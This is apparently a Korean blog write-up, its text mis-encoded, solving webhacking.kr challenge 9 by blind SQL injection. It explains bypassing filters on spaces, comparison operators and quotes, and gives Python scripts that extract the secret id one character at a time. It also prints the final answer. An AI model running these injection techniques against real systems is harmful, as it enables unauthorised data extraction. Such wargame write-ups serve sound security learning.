---
title: "[webhacking.kr] 9ë²ˆ ë¬¸ì œ í’€ì´[blind sql injection]"
categories:
  - webhacking
tags:
  - webhacking.kr
  - wargame
  - blind sql injection
toc: true
toc_sticky: true
toc_label: "9ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
---

ğŸ’¡ Webhacking.kr challenge(old) 9ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤.
{: .notice--warning}

# ë¬¸ì œ
## ë¬¸ì œ í™”ë©´ & ë¬¸ì œ ë¶„ì„
  ì²˜ìŒ ì ‘ì†í•˜ë©´ ê·¸ë¦¼ì²˜ëŸ¼ 1,2,3 í˜ì´ì§€ë¡œ ë„˜ì–´ê°ˆ ìˆ˜ ìˆê²Œ ë˜ì–´ ìˆìŠµë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/150671227-86f77835-8def-4b11-9892-3da591988d82.png)

  1,2,3ì„ ê°ê° ëˆŒëŸ¬ë³´ë©´ ë‹¤ìŒê³¼ ê°™ì€ í™”ë©´ì´ ë‚˜ì˜µë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/150671332-bb20d714-4707-4315-bdec-09489dcbab76.png)

  3ë²ˆ í˜ì´ì§€ë¥¼ ë³´ë‹ˆ no=3ì¼ë•Œì˜ idë¥¼ êµ¬í•˜ë©´ ë˜ëŠ” ë¬¸ì œ ì…ë‹ˆë‹¤. 

  ê°œë°œì ëª¨ë“œë¥¼ í†µí•œ ì†ŒìŠ¤ì½”ë“œë‚˜, ì¿ í‚¤ ê°’ì„ ë´ë„ ë³„ë‹¤ë¥¸ íŠ¹ì´ì‚¬í•­ì´ ì—†ìœ¼ë¯€ë¡œ blind sql injection ë¬¸ì œë¡œ ì¶”ì •ë©ë‹ˆë‹¤.

  ìœ„ì˜ ë‚´ìš©ì„ í† ëŒ€ë¡œ í…ŒìŠ¤íŠ¸ë¥¼ ì§„í–‰í•´ ë³´ê¸°ìœ„í•´ ë¡œì»¬ì— DBë¥¼ ë‹¤ìŒê³¼ ê°™ì´ êµ¬ì„±í–ˆìŠµë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/150671374-1d96ab3f-f296-450e-9841-249115a52fe0.png)

  
# ë¬¸ì œ í’€ì´
## í’€ì´ ì„¤ê³„
 í˜ì´ì§€ êµ¬ì„±ì´ ê°„ë‹¨í•´ì„œ í™”ë©´ì— 'Apple', 'Banana'ë¥¼ ë„ì›Œì£¼ëŠ” ë¶€ë¶„ì—ì„œ í˜¸ì¶œë˜ëŠ” SQLë¬¸ì€ ë‹¤ìŒê³¼ ê°™ë‹¤ê³  ì¶”ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
 ```sql
 select id from chall9 where no = {}
 ```

 ë”°ë¼ì„œ ```no={}```ë¶€ë¶„ì— mysql í•¨ìˆ˜ë“¤ì„ ì´ìš©í•´ì„œ ë‚˜ì˜¤ëŠ” ê²°ê³¼ì— ë”°ë¼ì„œ ì¶œë ¥ë˜ëŠ” id ê°’ì„ í†µí•´ì„œ í•¨ìˆ˜ë“¤ì˜ ê°’ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

 ì˜ˆë¥¼ë“¤ì–´ 
 ```
 select id from chall9 where no = 1=1
 ```

 ì„ ì…ë ¥í•œë‹¤ë©´ 1=1 -> 1 ì´ê¸° ë•Œë¬¸ì— í™”ë©´ì—ëŠ” 

 ```
 select id from chall9 where no=1 
 ```
 ì˜ ê²°ê³¼ ê°’ì¸ Appleì´ ë‚˜ì˜¬ ê²ƒì…ë‹ˆë‹¤.

 ë³¸ ë¬¸ì œì—ì„œëŠ” **=** ë¬¸ìê°€ í•„í„°ë§ ë˜ì–´ ìˆì–´ì„œ í…ŒìŠ¤íŠ¸ë¥¼ ë‹¤ìŒê³¼ ê°™ì´ ìˆ˜í–‰í•´ ë´¤ìŠµë‹ˆë‹¤.

 ![image](https://user-images.githubusercontent.com/33647663/150671579-fa139650-aa6a-4c46-abc5-dd81ca04f15d.png)

 ![image](https://user-images.githubusercontent.com/33647663/150671561-a098530d-1a47-4b1f-ab8c-dcc2896fab9b.png)

 ë‹¤ìŒê³¼ ê°™ì´ í•¨ìˆ˜ì˜ ê²°ê³¼ê°€ ê°ê° 1,2 ì´ê¸° ë•Œë¬¸ì— í™”ë©´ì— no=1ì¸ appleê³¼ no=2ì¸ bananaê°€ ì¶œë ¥ë˜ì—ˆìŠµë‹ˆë‹¤. 


## í•„í„°ë§ ìš°íšŒ
 ìš°ì„  ì´ë²ˆ ë¬¸ì œëŠ” í•„í„°ë§ì´ ìƒê°ë³´ë‹¤ ë§ì´ ë˜ì–´ ìˆì—ˆìŠµë‹ˆë‹¤. ì œê°€ ìƒê°í•œ ëŒ€ë¶€ë¶„ì˜ ë¬¸ìê°€ í•„í„°ë§ ë˜ì–´ ìˆì—ˆëŠ”ë° ê·¸ì¤‘ ê°€ì¥ ìš°íšŒí•˜ê¸° í˜ë“  ê²ƒì€ **ê³µë°±**í•„í„°ë§ê³¼, **ë¹„êµì—°ì‚°ì** ('=','<','>')í•„í„°ë§ ê·¸ë¦¬ê³  **ë¬¸ìì—´ í•„í„°ë§**(') ì´ì—ˆìŠµë‹ˆë‹¤.
 
 ì²«ë²ˆì§¸ë¡œ ê³µë°±ë¬¸ì(%20,%09,%0a)ê°€ ëª¨ë‘ í•„í„°ë§ ë˜ì–´ ìˆì—ˆê¸° ë•Œë¬¸ì— ì—¬ëŸ¬ í•¨ìˆ˜ë“¤ì„ ì‚¬ìš©í•˜ê¸° ìœ„í•´ì„œëŠ” ë‹¤ìŒì²˜ëŸ¼  '(', ')'ë¥¼ ì´ìš©í•´ì„œ ì‚¬ìš©í•´ì•¼ í–ˆìŠµë‹ˆë‹¤.

 ![image](https://user-images.githubusercontent.com/33647663/150672184-4a075979-e14d-409f-85ec-29ccf344424a.png)
 
 ë‘ë²ˆì§¸ë¡œ, ë‹¨ìˆœ ë¹„êµì—°ì‚°ì„ í•˜ê¸° ìœ„í•´ í•„ìš”í•œ ì—°ì‚°ìë“¤ì´ ëª¨ë‘ í•„í„°ë§ ë˜ì–´ ìˆì–´ì„œ ì´ë¥¼ ìš°íšŒí•˜ê¸° ìœ„í•´ì„œ like í•¨ìˆ˜ë¥¼ ì‚¬ìš©í–ˆìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  ë§ˆì§€ë§‰ìœ¼ë¡œ like ë¥¼ ì‚¬ìš©í•˜ë ¤ë©´ ë‹¤ìŒì²˜ëŸ¼ ì‚¬ìš©ì´ ê°€ëŠ¥í•œë°
 ```sql
    select substr('admin',1,1) like 'a'
 ```

 ![image](https://user-images.githubusercontent.com/33647663/150672123-1eafc525-4614-4587-8349-73736bd12110.png)

  (') ì„¸ë¯¸ì½œë¡ ì´ í•„í„°ë§ ë˜ì–´ ìˆì–´ì„œ ë‹¤ìŒì²˜ëŸ¼ 0x61ê°™ì´ hexê°’ìœ¼ë¡œ ìš°íšŒë¥¼ í–ˆìŠµë‹ˆë‹¤. 

  ![image](https://user-images.githubusercontent.com/33647663/150672149-d213b031-a0ed-49bc-95b9-5d1b4fa56700.png)

  ê·¸ë¦¬ê³  ì´ë²ˆ ë¬¸ì œì—ì„œ ì¸ì ì…˜ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ì„œëŠ” ë‹¤ìŒì˜ ê°œë…ì„ ì •í™•í•˜ê²Œ ì´í•´í•´ì•¼ í•©ë‹ˆë‹¤.

  ìš°ì„  í˜„ì¬ í…Œì´ë¸”ì— ìˆëŠ” ì •ë³´ê°€ ë‹¤ìŒê³¼ ê°™ë‹¤ê³  í• ë•Œ,

  | id | no |
  |:---:|:---:|
  |apple|1|
  |banana|2|
  |secret_word|3|
  
  ì•„ë˜ sqlë¬¸ì´ ì–´ë–»ê²Œ ë™ì‘í•˜ëŠ”ì§€ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤.

  ```sql
  select id from chall9 where no = (length(id)=5);
  ```

  ìš°ì„  ìœ„ì˜ ì¿¼ë¦¬ë¬¸ì„ ì‹¤í–‰í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ 'apple'ì´ ë‚˜ì˜µë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/150687330-1312ea33-3d9d-40b6-9369-bd974bdc631d.png)

  ê·¸ëŸ¬ë©´ ë‹¤ìŒ sql ë¬¸ì€ ì–´ë–»ê²Œ ë™ì‘í• ê¹Œìš”? sqlë¬¸ì´ ìµìˆ™í•˜ì§€ ì•Šìœ¼ì‹  ë¶„ì€ ì•„ë§ˆ 'banana'ê°€ ë‚˜ì˜¬ê±°ë¼ê³  ìƒê°í•  ìˆ˜ë„ ìˆëŠ”ë° ê²°ê³¼ëŠ” ì•„ë¬´ê²ƒë„ ì¶œë ¥ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

  ```sql
  select id from chall9 where no = (length(id)=6);
  ```

  ![image](https://user-images.githubusercontent.com/33647663/150687398-53b90d56-53f0-4d98-9faf-9d2bc02db4ef.png)

  ì´ë¥¼ ì´í•´í•˜ê¸° ìœ„í•´ì„œëŠ” ìœ„ì˜ ì¿¼ë¦¬ë¬¸ì´ ê°ê°ì˜ ì—´ì— ëŒ€í•´ì„œ ë‹¤ ë‹¤ë¥´ê²Œ ì‘ë™ëœë‹¤ëŠ” ê²ƒì„ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤. ë¨¼ì € length(id)=5 ì¸ê²½ìš°ì— ëŒ€í•´ì„œëŠ” ê°ê°ì˜ ì—´ì—ì„œ ì¿¼ë¦¬ê°€ ë‹¤ìŒê³¼ ê°™ì´ ë³€í™˜ë©ë‹ˆë‹¤.

  ```sql
  apple : length(id) = 5  --> 1
  select id from chall9 where no = 1
  --> appleì˜ no = 1ì´ê¸° ë•Œë¬¸ì— ì¡°ê±´ì„ ë§Œì¡±í•˜ì—¬ ì¶œë ¥

  banana : length(id) = 5  --> 0
  select id from chall9 where no = 0
  --> bananaì˜ no = 2ì´ê¸° ë•Œë¬¸ì— ì¶œë ¥ë˜ì§€ ì•ŠìŒ

  secret_word : length(id) =5 --> 0
  select id from chall9 where no = 0
  --> secret_wordì˜ no = 3ì´ê¸° ë•Œë¬¸ì— ì¶œë ¥ë˜ì§€ ì•ŠìŒ 
  ```


  ê°™ì€ ë°©ì‹ìœ¼ë¡œ length(id)=6ì¸ ê²½ìš°ì—ëŠ” ë‹¤ìŒê³¼ ê°™ì´ 1ì°¨ì ì¸ ì—°ì‚°ì´ ìˆ˜í–‰ë©ë‹ˆë‹¤. 

  ![image](https://user-images.githubusercontent.com/33647663/150687850-b1f7a192-0b75-45ed-ab3d-976f0b9ad3bc.png)

  ê·¸ ë‹¤ìŒì€ 3ê°œì˜ ì—´ì— ê°ê°
  ```sql
  apple : select id from chall9 where no =0;

  banana: select id from chall9 where no =1;
  
  secret_word : select id from chall9 whrer no=0;
  ```

  ì´ë ‡ê²Œ ë‚˜ì˜¤ê²Œ ë©ë‹ˆë‹¤. ì—¬ê¸°ê¹Œì§€ë§Œ ë´¤ì„ë•Œ, bananaì˜ ê²½ìš° ì¶œë ¥ê°’ì´ ```select id from chall9 where no =1```ì´ê¸° ë•Œë¬¸ì— ê·¸ë ‡ë‹¤ë©´ ```apple```ì´ ê²°ê³¼ë¡œ ë‚˜ì˜¤ëŠ” ê±´ê°€? ë¼ê³  ìƒê°í•  ìˆ˜ë„ ìˆì§€ë§Œ, no = 1ì´ ë‚˜ì˜¬ë•ŒëŠ” length(id) = 6ì´ê¸° ë•Œë¬¸ì—[id:bananaì¸ ê²½ìš°] 1ì´ ë‚˜ì˜¨ê²ƒì´ë¼ì„œ ì´ëŠ” ë…¼ë¦¬ì ìœ¼ë¡œ ë§ì§€ ì•ŠìŠµë‹ˆë‹¤. ê·¸ë˜ì„œ length(id) = 6ì¸ bananaê°’ì„ ì¿¼ë¦¬ë¬¸ì„ í†µí•´ì„œ ì°¾ê³  ì‹¶ë‹¤ë©´ ë‹¤ìŒê³¼ ê°™ì€ ë°©ë²•ì„ ì‚¬ìš©í•´ ì¤˜ì•¼ í•©ë‹ˆë‹¤.

  ```sql
  select id from chall9 where no = if(length(id)=6,2,0);
  ```

  ì´ë ‡ê²Œ ëœë‹¤ë©´ length(id) = 6ì´ ì°¸ì´ë¼ë©´, ifë¬¸ì— ì˜í•´ì„œ ê²°ê³¼ê°’ì´ 2ê°€ ë˜ë©° ê²°ê³¼ì ìœ¼ë¡œëŠ” 'banana'ì—´ì€
  ```sql
  select id from chall9 where no = 2
  ```
  ê°€ ë˜ê²Œ ë©ë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/150688077-3f8be46b-d73a-4ea2-9d05-44c17cf76e8b.png)

  ìœ„ì˜ ê°œë…ë“¤ì„ ë‹¤ ì •ë¦¬í•˜ê³  ë‚œ í›„ íŒŒì´ì¬ ì½”ë“œë¥¼ ì‘ì„±í•˜ì—¬ ìë™í™” ì‹œì¼°ìŠµë‹ˆë‹¤.

  ---
  ë¨¼ì € idì˜ ê¸¸ì´ë¥¼ ì•Œì•„ë‚´ëŠ” ì¿¼ë¦¬ ì…ë‹ˆë‹¤. ì¢€ì „ì— ì„¤ëª…í–ˆë˜ ê°œë…ëŒ€ë¡œ if(length(id)like($ê¸¸ì´),3,0) í˜•íƒœë¡œ ì¿¼ë¦¬ë¥¼ ì‘ì„±í•´ ì¤¬ìŠµë‹ˆë‹¤. 

  ```python
    url = "https://webhacking.kr/challenge/web-09/index.php?no="
    params = 'if(length(id)like({}),3,0)'
    TRUE_FLAG = 'Secret'

    # passwordì˜ ê¸¸ì´ë¥¼ êµ¬í•˜ëŠ” ì¿¼ë¦¬
    for i in range(15):
        request_url = url + params.format(i)
        response = requests.get(request_url)
        if(TRUE_FLAG in response.text):
            print("id's length : " + str(i))

  ```
  
  ê·¸ë‹¤ìŒì€ ë¹„ë°€ë²ˆí˜¸ì˜ ê¸¸ì´ë§Œí¼ substrì„ ì´ìš©í•˜ì—¬ í•œ ê¸€ìì”© ì•Œì•„ë‚´ëŠ” ì¿¼ë¦¬ì…ë‹ˆë‹¤. ë§¨ ì•„ë˜ì˜ ì‹¤í–‰ ê²°ê³¼ë¥¼ ë³´ë©´ í•œ ê¸€ìì”© a,b,c,d, ... ì´ë ‡ê²Œ ë¹„êµë¥¼ í•´ê°€ë©´ì„œ ê²°ê³¼ë¥¼ ë¹„êµí•˜ëŠ” ê³¼ì •ì…ë‹ˆë‹¤.

  ```python
    password = ''
    for i in range(1,12):
        for j in range(65,127):
            params = 'if(substr(id,{},1)like({}),3,0)'.format(i,hex(j))
            print(params)
            request_url = url + params
            response = requests.get(request_url)
            if(TRUE_FLAG in response.text):
                print('find {}st character : {}'.format(i,chr(j)))
                password += chr(j)
                break
   ```


  ìµœì¢… ì‹¤í–‰ê²°ê³¼ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ë‚˜ì™”ìœ¼ë©°, ë¹„ë°€ë²ˆí˜¸ì¸ 'alsrkswhaql'ë¥¼ ì…ë ¥í•´ ì£¼ë©´ ë¬¸ì œê°€ í’€ë¦½ë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/150688879-6ceaf98d-8c5c-4397-8e70-2198aa3bd480.png)

  ![image](https://user-images.githubusercontent.com/33647663/150688956-fe00747b-35df-4df7-965b-2e256b11e984.png)

